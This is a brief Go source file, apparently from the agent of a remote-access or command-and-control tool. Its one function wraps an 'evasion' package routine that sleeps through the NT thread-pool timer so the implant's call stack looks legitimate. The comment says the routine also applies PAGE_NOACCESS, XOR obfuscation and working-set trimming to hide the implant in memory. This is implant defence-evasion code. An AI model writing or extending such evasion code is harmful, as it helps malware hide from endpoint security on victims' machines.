//go:build windows
// +build windows

package main

import (
	"time"

	"overlord-client/cmd/agent/evasion"
)

// obfSleepDuration sleeps for d using the NT thread-pool timer so the
// waiting call stack looks like a legitimate thread-pool worker instead of
// ntdll!NtDelayExecution.  Falls back to SleepObfuscated on failure.
// PAGE_NOACCESS / XOR-obfuscation / working-set trim are applied by both paths.
func obfSleepDuration(d time.Duration) {
	evasion.TpTimerSleep(d)
}
